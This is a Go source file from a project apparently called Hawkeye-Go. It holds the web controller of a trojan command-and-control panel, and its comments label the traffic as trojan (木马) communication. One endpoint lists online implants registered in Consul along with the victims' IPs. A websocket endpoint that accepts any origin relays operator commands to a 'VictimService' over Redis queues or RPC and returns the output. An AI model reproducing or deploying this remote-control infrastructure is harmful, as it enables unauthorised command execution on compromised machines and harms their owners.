package controller

import (
	"context"
	"fmt"
	"log"
	"net/http"
	"strings"
	"time"

	"github.com/e421083458/golang_common/lib"
	"github.com/gin-gonic/gin"
	"github.com/gomodule/redigo/redis"
	"github.com/gorilla/websocket"
	"github.com/wh1t3zer/Hawkeye-Go/dao"
	"github.com/wh1t3zer/Hawkeye-Go/dto"
	"github.com/wh1t3zer/Hawkeye-Go/micro/proto/model"
	"github.com/wh1t3zer/Hawkeye-Go/micro/proto/rpcapi"
	"github.com/wh1t3zer/Hawkeye-Go/middleware"
	"github.com/wh1t3zer/Hawkeye-Go/utils"
	"github.com/micro/go-micro"
	"github.com/micro/go-micro/registry"
	"github.com/micro/go-plugins/registry/consul"
)

// TrojanController ...
type TrojanController struct{}

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
}

// TrojanRegister ...
func TrojanRegister(group *gin.RouterGroup) {
	trojan := &TrojanController{}
	group.GET("/echo", trojan.Websocket)
	group.GET("/service/list", trojan.GetServiceList)
}

// GetServiceList godoc
// @Summary 获取在线木马服务列表
// @Description 获取在线木马服务列表
// @Tags 浮标管理
// @ID /trojan/service/list
// @Accept json
// @Produce json
// @Param info query string false "关键词"
// @Param limit query int true "每页个数"
// @Param page query int true "当前页数"
// @Success 200 {object} middleware.Response{data=dto.TrojanListOutput} "success"
// @Router /trojan/service/list [get]
func (t *TrojanController) GetServiceList(c *gin.Context) {
	inputParams := &dto.PublicListInput{}

	if err := inputParams.GetValidParams(c); err != nil {
		middleware.ResponseError(c, middleware.InvalidRequestErrorCode, err)
		return
	}
	// 获取注册中心对象
	reg := consul.NewRegistry(registry.Addrs(lib.GetStringConf("micro.consul.registry_address")))
	getService, err := reg.ListServices()
	if err != nil {
		middleware.ResponseError(c, middleware.InternalErrorCode, err)
		return
	}

	// 格式化输出
	outList := []*dto.TrojanItemOutput{}
	var total int64 = 0
	skip := int64(inputParams.Limit * (inputParams.Page - 1))
	for _, value := range getService {
		keyInfo := strings.TrimSpace(inputParams.Info)
		if total-skip >= int64(inputParams.Limit) { // 1.是否超过限制数
			break
		}
		if keyInfo != "" && strings.Contains(value.Name, keyInfo) || keyInfo == "" { // 2.关键词匹配
			if total >= skip { // 跳过多少条? 如果现在总量大于跳过总量
				portID, err := utils.TrojanInfoHandler(value)
				if err != nil {
					continue
				}
				search := &dao.PortInfo{ID: portID}
				portinfo, err := search.Find(c, lib.GORMDefaultPool, search)
				if err != nil || portinfo.ID < 0 {
					fmt.Println("出错或者没找到这个端口ID", err)
					continue // 出错或者没找到这个端口ID
				}
				fmt.Printf("%#v\n", portinfo)
				search2 := &dao.AssetInfo{ID: portinfo.AssetID}
				asset, _ := search2.Find(c, lib.GORMDefaultPool, search2)

				api := utils.NewConsulAPI(portID)
				addr, port, err := api.GetRealServer()
				if err != nil {
					fmt.Println("出错了", err)
				}

				line := 1
				if strings.Contains(addr, asset.IP) {
					line = 2
				}

				outList = append(outList, &dto.TrojanItemOutput{
					PortID: int64(portID), PortName: portinfo.Port, AssetID: asset.ID, AssetIP: asset.IP, SpareLine: int8(line),
					RealServer: fmt.Sprintf("%v:%v", addr, port), CreateAT: asset.CreatedAt.Format("2006-01-02 15:04:05"),
				})
			}
			total++
		}
	}
	out := &dto.TrojanListOutput{Total: total - skip, List: outList}
	middleware.ResponseSuccess(c, out)
}

// Websocket godoc
// @Summary WS即时通
// @Description 木马通信
// @Tags 浮标管理
// @ID /trojan/echo
// @Accept json
// @Produce json
// @Param id query int true "资产ID"
// @Param name query int true "资产名"
// @Param line query int true "线路ID"
// @Success 200 {object} middleware.Response{data=string} "success"
// @Router /trojan/echo [get]
func (t *TrojanController) Websocket(c *gin.Context) {
	inputParams := &dto.TrojanConnInput{}
	if err := inputParams.GetValidParam(c); err != nil {
		middleware.ResponseError(c, middleware.InvalidRequestErrorCode, err)
		return
	}

	// 1.升级get请求为webSocket协议
	ws, err := upgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		middleware.ResponseError(c, middleware.InternalErrorCode, err)
		return
	}
	defer ws.Close()

	// 2.1号线为穿透线路
	if inputParams.SpareLine == 1 {
		// 连接redis
		conn, err := redis.Dial("tcp", lib.ConfRedisMap.List["default"].ProxyList[0])
		if err != nil {
			middleware.ResponseError(c, middleware.InternalErrorCode, err)
			return
		}
		for {
			// 读取ws数据
			mt, message, err := ws.ReadMessage()
			if err != nil {
				ws.WriteMessage(mt, []byte(fmt.Sprintf("Failed Read Message, info: %v", err)))
				log.Printf("Read error, info: %v", err)
				break
			}
			log.Printf("Recv data from client(%v): %s, %v", c.ClientIP(), message, mt)

			// 向gmq写入ws数据
			// rsp, err := conn.Communication(context.Background(), &model.Request{Cmd: string(message)})
			gmq := fmt.Sprintf("g%s", inputParams.AssetID)
			if _, err = conn.Do("rpush", gmq, string(message)); err != nil {
				log.Printf("Failed Write Message, info: %v", err)
				ws.WriteMessage(mt, []byte(fmt.Sprintf("Failed Write Message, info: %v", err)))
				continue
			}
			// 从rmq获取数据
			rmq := fmt.Sprintf("r%s", inputParams.AssetID)
			var result = []byte("recv data timeout.")
			for i := 0; i < 10; i++ {
				ele, err := redis.String(conn.Do("lpop", rmq))
				if err != nil {
					time.Sleep(time.Second)
					continue
				}
				fmt.Println("===>", ele)
				result = []byte(ele)
			}
			if err = ws.WriteMessage(mt, result); err != nil {
				log.Println("Write error, info: ", err)
				break
			}
		}
	}
	if inputParams.SpareLine == 2 {
		// 获取注册中心对象
		reg := consul.NewRegistry(registry.Addrs(lib.GetStringConf("micro.consul.registry_address")))
		// 实例化服务
		service := micro.NewService(micro.Registry(reg))
		service.Init()
		// 获取服务连接对象
		conn := rpcapi.NewVictimService(inputParams.AssetID, service.Client())
		fmt.Printf("???.> %v\n", inputParams.AssetID)

		for {
			// 读取ws数据
			mt, message, err := ws.ReadMessage()
			if err != nil {
				ws.WriteMessage(mt, []byte(fmt.Sprintf("Failed Read Message, info: %v", err)))
				log.Printf("Read error, info: %v", err)
				break
			}
			log.Printf("Recv data from client(%v): %s, %v", c.ClientIP(), message, mt)

			// 写入ws数据
			rsp, err := conn.Communication(context.Background(), &model.Request{Cmd: string(message)})
			if err != nil {
				log.Printf("Failed Write Message, info: %v", err)
				ws.WriteMessage(mt, []byte(fmt.Sprintf("Failed Write Message, info: %v", err)))
				continue
			}
			if err = ws.WriteMessage(mt, []byte(rsp.Msg)); err != nil {
				log.Println("Write error, info: ", err)
				break
			}
		}
	}
	log.Printf("Websocket finished, info: %v", fmt.Sprint(err))
}
